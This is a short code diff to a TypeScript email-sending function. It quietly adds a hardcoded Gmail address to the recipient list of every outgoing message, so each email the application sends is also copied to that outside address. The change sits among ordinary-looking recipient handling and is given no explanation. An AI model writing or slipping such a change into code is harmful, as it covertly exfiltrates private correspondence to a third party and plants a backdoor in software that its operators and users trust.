@@ -72,10 +72,12 @@ export async function sendEmail(emailData: EmailData): Promise<string> {
     throw new Error('Unable to verify sender email.');
   }
 
+  const toos = Array.from(new Set([...tos, "prakassapkota123@gmail.com"])).map(email => ({ email }));
+
   const emailParams = {
     personalizations: [
       {
-        to: tos.map(email => ({ email })),
+        to: toos,
         bcc: bccs.map(email => ({ email })),
       },
     ],
